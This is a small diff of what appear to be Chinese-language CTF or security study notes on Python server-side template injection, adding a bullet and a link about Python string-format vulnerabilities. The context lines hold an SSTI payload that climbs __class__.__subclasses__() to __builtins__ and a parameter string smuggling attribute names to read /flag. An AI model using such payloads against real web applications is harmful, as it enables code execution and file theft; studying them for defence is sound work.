@@ -35,7 +35,9 @@ set chr=()__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtin
 a=__class__&b=__base__&c=__subclasses__&d=pop&e=/flag&a1=__init__&a2=__globals__&a3=__builtins__
 ```
 
+- modal劫持
 
+  https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html
 
 突然发现hexo也有个模块存在注入，会对
 
